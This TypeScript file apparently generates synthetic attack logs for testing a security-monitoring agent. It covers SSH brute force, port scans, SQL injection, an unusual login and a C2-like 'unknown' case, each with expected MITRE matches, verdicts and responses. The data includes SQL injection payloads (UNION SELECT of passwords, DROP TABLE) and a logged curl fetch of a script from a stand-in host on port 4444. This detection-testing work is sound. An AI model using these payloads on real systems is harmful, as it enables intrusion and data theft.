// One template per attack scenario (docs/PROJECT_PLAN.md section 8).
// A run produces the attack logs plus the evidence the agents would derive from them.
import type { ConfidenceBreakdown, MitreMatch, ProposedAction, ScenarioId, Severity, Verdict } from '@/types'
import { HOSTS, UA, attackerIp, internalIp, nginxLine, sshLine, systemLine, ufwLine, visitorIp, type LogDraft } from './format'
import type { Rng } from './random'

export interface ScenarioRun {
  logs: LogDraft[]
  /** Older events for the same IP/user that Watcher pulls as context. */
  related: LogDraft[]
  src_ip: string
  summary: string
  rule_hits: string[]
  severity: Severity
  matches: MitreMatch[]
  verdict: Omit<Verdict, 'llm_confidence' | 'needs_more_context' | 'context_query'>
  factors: ConfidenceBreakdown
  proposed: ProposedAction | null
  context: { query: string; result: string }[]
}

export type Variant = 'loud' | 'quiet' | 'escalate' | 'benign' | 'priya' | 'arjun'
type Run = (rng: Rng, at: number, variant?: Variant) => ScenarioRun

const MIN = 60_000
const HOUR = 60 * MIN
const DAY = 24 * HOUR

const jitterAll = (rng: Rng, f: ConfidenceBreakdown): ConfidenceBreakdown => ({
  anomaly: rng.jitter(f.anomaly, 0.02),
  mitre: rng.jitter(f.mitre, 0.02),
  llm: rng.jitter(f.llm, 0.02),
  history: rng.jitter(f.history, 0.03),
})

const sshBruteforce: Run = (rng, at) => {
  const ip = attackerIp(rng)
  const n = rng.int(28, 64)
  const span = rng.int(40, 95)
  const users = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'git', 'pi']
  const logs = Array.from({ length: n }, (_, i) => sshLine(at + (i / n) * span * 1000, rng, ip, rng.pick(users), false, 'password'))
  const tried = new Set(logs.map((l) => l.user)).size
  return {
    logs,
    related: [ufwLine(at - rng.int(2, 6) * DAY, 'BLOCK', ip, HOSTS.web, rng.int(40000, 60000), 23)],
    src_ip: ip,
    summary: `${n} failed SSH logins in ${span}s`,
    rule_hits: ['ssh_failures ≥ 5 / 60s', 'username_spray'],
    severity: 'high',
    matches: [
      { id: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'Credential Access', similarity: 0.91 },
      { id: 'T1110', name: 'Brute Force', tactic: 'Credential Access', similarity: 0.89 },
      { id: 'T1021.004', name: 'Remote Services: SSH', tactic: 'Lateral Movement', similarity: 0.62 },
    ],
    verdict: {
      technique_id: 'T1110',
      technique_name: 'Brute Force',
      is_malicious: true,
      reasoning: `${n} password failures across ${tried} usernames from one external IP in ${span}s, no success. Classic password guessing.`,
    },
    factors: jitterAll(rng, { anomaly: 0.95, mitre: 0.91, llm: 0.93, history: 0.8 }),
    proposed: { type: 'block_ip', target: ip },
    context: [],
  }
}

const portScan: Run = (rng, at) => {
  const ip = attackerIp(rng)
  const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017]
  const n = rng.int(40, 110)
  const span = rng.int(12, 28)
  const logs = Array.from({ length: n }, (_, i) =>
    ufwLine(at + (i / n) * span * 1000, 'BLOCK', ip, rng.pick(Object.values(HOSTS)), rng.int(40000, 65000), i < ports.length ? ports[i] : rng.int(1, 65535)),
  )
  return {
    logs,
    related: [],
    src_ip: ip,
    summary: `${n} ports probed in ${span}s`,
    rule_hits: ['port_sweep ≥ 20 / 30s'],
    severity: 'medium',
    matches: [
      { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery', similarity: 0.86 },
      { id: 'T1595.001', name: 'Active Scanning: Scanning IP Blocks', tactic: 'Reconnaissance', similarity: 0.79 },
      { id: 'T1018', name: 'Remote System Discovery', tactic: 'Discovery', similarity: 0.55 },
    ],
    verdict: {
      technique_id: 'T1046',
      technique_name: 'Network Service Discovery',
      is_malicious: true,
      reasoning: `SYN probes to ${n} ports across ${Object.keys(HOSTS).length} hosts in ${span}s from one source. Service discovery ahead of an attack.`,
    },
    factors: jitterAll(rng, { anomaly: 0.9, mitre: 0.86, llm: 0.88, history: 0.6 }),
    proposed: { type: 'block_ip', target: ip },
    context: [],
  }
}

const sqlInjection: Run = (rng, at, variant = 'loud') => {
  const ip = attackerIp(rng)
  const loud = variant === 'loud'
  const payloads = [
    "/products?id=1'%20OR%20'1'='1",
    '/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--',
    "/search?q=%27%3BDROP%20TABLE%20orders--",
    '/products?id=1%20AND%20SLEEP(5)',
    "/login?user=admin'--",
  ]
  const n = loud ? rng.int(24, 60) : rng.int(4, 7)
  const logs = Array.from({ length: n }, (_, i) =>
    nginxLine(at + i * (loud ? 900 : 14_000), ip, 'GET', rng.pick(payloads), loud ? rng.pick([500, 500, 403]) : rng.pick([400, 404]), rng.int(180, 900), loud ? UA.sqlmap : UA.firefox),
  )
  return {
    logs,
    related: loud ? [] : [nginxLine(at - 3 * HOUR, ip, 'GET', '/products?page=3', 200, 5120, UA.firefox)],
    src_ip: ip,
    summary: loud ? `${n} SQL injection payloads, sqlmap UA` : `${n} suspicious query strings`,
    rule_hits: loud ? ['sqli_pattern', 'scanner_user_agent', 'http_5xx_burst'] : ['sqli_pattern'],
    severity: loud ? 'high' : 'medium',
    matches: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access', similarity: loud ? 0.84 : 0.78 },
      { id: 'T1595.002', name: 'Active Scanning: Vulnerability Scanning', tactic: 'Reconnaissance', similarity: loud ? 0.71 : 0.64 },
      { id: 'T1213', name: 'Data from Information Repositories', tactic: 'Collection', similarity: loud ? 0.48 : 0.4 },
    ],
    verdict: {
      technique_id: 'T1190',
      technique_name: 'Exploit Public-Facing Application',
      is_malicious: true,
      reasoning: loud
        ? `Automated injection: ${n} UNION/boolean/time-based payloads from sqlmap, server returning 500s.`
        : `Injection-like query strings from a browser UA, all rejected with 4xx. Could be a manual probe or a buggy client.`,
    },
    factors: jitterAll(rng, loud ? { anomaly: 0.88, mitre: 0.84, llm: 0.9, history: 0.7 } : { anomaly: 0.7, mitre: 0.78, llm: 0.72, history: 0.3 }),
    proposed: { type: 'block_ip', target: ip },
    context: [],
  }
}

const oddLogin: Run = (rng, at, variant = 'priya') => {
  // Fixed IPs per user so the two stories never share a source.
  const who = variant === 'arjun' ? { user: 'arjun.m', geo: 'Singapore', ip: '203.0.113.88' } : { user: 'priya.k', geo: 'Vietnam', ip: '198.51.100.244' }
  const ip = who.ip
  const logs = [
    sshLine(at, rng, ip, who.user, true, 'password', { geo: who.geo, usual_geo: 'India' }),
    systemLine(at + 1200, 'bastion', ip, 'session_open', `systemd-logind[811]`, `New session 4127 of user ${who.user}.`, { user: who.user }),
  ]
  const related = [1, 2, 4, 6].map((d) => sshLine(at - d * DAY + 7 * HOUR, rng, internalIp(rng), who.user, true, 'publickey', { geo: 'India' }))
  return {
    logs,
    related,
    src_ip: ip,
    summary: `${who.user} logged in at ${new Date(at).getHours()}:${String(new Date(at).getMinutes()).padStart(2, '0')} from ${who.geo}`,
    rule_hits: ['login_unusual_hour', 'new_country_for_user'],
    severity: 'medium',
    matches: [
      { id: 'T1078', name: 'Valid Accounts', tactic: 'Initial Access', similarity: 0.7 },
      { id: 'T1133', name: 'External Remote Services', tactic: 'Persistence', similarity: 0.63 },
      { id: 'T1110.004', name: 'Brute Force: Credential Stuffing', tactic: 'Credential Access', similarity: 0.41 },
    ],
    verdict: {
      technique_id: 'T1078',
      technique_name: 'Valid Accounts',
      is_malicious: true,
      reasoning: `Correct password on the first try, but at night, from a new country, with password instead of the usual key. Could be travel or a stolen credential.`,
    },
    factors: jitterAll(rng, { anomaly: 0.62, mitre: 0.7, llm: 0.58, history: 0.2 }),
    proposed: { type: 'disable_user', target: who.user },
    context: [
      {
        query: `logins for ${who.user}, last 30 days`,
        result: `21 logins, all from India over VPN with a key, 09:00–19:00. Never from this IP.`,
      },
    ],
  }
}

const unknown: Run = (rng, at, variant = 'escalate') => {
  if (variant === 'benign') {
    const logs = Array.from({ length: 6 }, (_, i) =>
      systemLine(at + i * 40_000, 'db-01', HOSTS.db, 'net_outbound', 'rsync[5521]', `sent ${rng.int(800, 1400)} MB to 10.0.9.4 (backup-02)`, { bytes_mb: 1100, dst: '10.0.9.4' }),
    )
    return {
      logs,
      related: [systemLine(at - DAY, 'db-01', HOSTS.db, 'net_outbound', 'rsync[5480]', 'sent 312 MB to 10.0.9.4 (backup-02)')],
      src_ip: HOSTS.db,
      summary: 'Unusual outbound volume from db-01',
      rule_hits: ['isolation_forest: bytes_out'],
      severity: 'low',
      matches: [
        { id: 'T1048', name: 'Exfiltration Over Alternative Protocol', tactic: 'Exfiltration', similarity: 0.34 },
        { id: 'T1030', name: 'Data Transfer Size Limits', tactic: 'Exfiltration', similarity: 0.29 },
        { id: 'T1020', name: 'Automated Exfiltration', tactic: 'Exfiltration', similarity: 0.27 },
      ],
      verdict: { technique_id: null, technique_name: null, is_malicious: false, reasoning: 'Internal rsync to the backup host. Larger than usual, but expected destination and process.' },
      factors: jitterAll(rng, { anomaly: 0.35, mitre: 0.3, llm: 0.2, history: 0 }),
      proposed: null,
      context: [],
    }
  }
  const c2 = '198.51.100.23'
  const logs = [
    systemLine(at, 'app-02', HOSTS.app, 'process_exec', 'audit[8812]', `EXECVE a0="curl" a1="-s" a2="http://${c2}/u.sh"`, { pid: 8812, exe: 'curl' }),
    ufwLine(at + 3000, 'ALLOW', HOSTS.app, c2, rng.int(40000, 60000), 4444),
    systemLine(at + 9000, 'app-02', HOSTS.app, 'net_outbound', 'conntrack', `ESTABLISHED ${HOSTS.app}:51822 -> ${c2}:4444 bytes=2.1MB`, { bytes_mb: 2.1, dst: c2 }),
    nginxLine(at + 15_000, HOSTS.app, 'GET', '/admin/export?fmt=csv', 200, 884_211, 'python-requests/2.32'),
  ]
  return {
    logs,
    related: [],
    src_ip: HOSTS.app,
    summary: 'app-02 talking to an unknown host on :4444',
    rule_hits: ['isolation_forest: dst_port', 'rare_process_network'],
    severity: 'high',
    matches: [
      { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control', similarity: 0.38 },
      { id: 'T1071.001', name: 'Application Layer Protocol: Web', tactic: 'Command and Control', similarity: 0.33 },
      { id: 'T1048', name: 'Exfiltration Over Alternative Protocol', tactic: 'Exfiltration', similarity: 0.31 },
    ],
    verdict: {
      technique_id: null,
      technique_name: null,
      is_malicious: false,
      reasoning: 'A download, a non-standard port and a large export, but no single technique fits well. Not enough to act alone.',
    },
    factors: jitterAll(rng, { anomaly: 0.66, mitre: 0.38, llm: 0.45, history: 0.1 }),
    proposed: { type: 'block_ip', target: c2 },
    context: [
      { query: `outbound connections from app-02, last 24h`, result: `4 sessions to ${c2}:4444, first seen 02:41. No other host talks to it.` },
      { query: 'parent process of PID 8812', result: 'Started by cron (backup.sh). Script unchanged since last deploy.' },
    ],
  }
}

/** Normal traffic. Never raises an alert (false-positive check). */
export function normalLog(rng: Rng, at: number): LogDraft {
  const r = rng.next()
  if (r < 0.45) {
    const path = rng.pick(['/', '/api/orders', '/api/products?page=2', '/static/app.js', '/login', '/api/cart', '/health'])
    return nginxLine(at, visitorIp(rng), rng.chance(0.85) ? 'GET' : 'POST', path, rng.pick([200, 200, 200, 200, 304, 302, 404]), rng.int(300, 48_000), rng.pick([UA.chrome, UA.safari, UA.firefox]))
  }
  if (r < 0.65) return ufwLine(at, 'ALLOW', visitorIp(rng), HOSTS.web, rng.int(40000, 65000), 443)
  if (r < 0.8) return sshLine(at, rng, internalIp(rng), rng.pick(['deploy', 'svc-backup', 'vedang.d', 'lakshya.r']), true, 'publickey')
  const sys = rng.pick([
    ['app-01', 'cron', 'CRON[1201]', '(root) CMD (/usr/local/bin/rotate-logs.sh)'],
    ['db-01', 'service', 'systemd[1]', 'Started Daily apt download activities.'],
    ['web-01', 'service', 'nginx[882]', 'signal process started (reload)'],
    ['app-02', 'cron', 'CRON[3310]', '(svc-backup) CMD (/opt/backup.sh --incremental)'],
  ] as const)
  return systemLine(at, sys[0], HOSTS.app, sys[1], sys[2], sys[3])
}

export const SCENARIOS: Record<Exclude<ScenarioId, 'normal'>, { label: string; run: Run }> = {
  ssh_bruteforce: { label: 'SSH brute force', run: sshBruteforce },
  port_scan: { label: 'Port scan', run: portScan },
  sql_injection: { label: 'SQL injection', run: sqlInjection },
  odd_login: { label: '3 AM login', run: oddLogin },
  unknown: { label: 'Unknown behaviour', run: unknown },
}
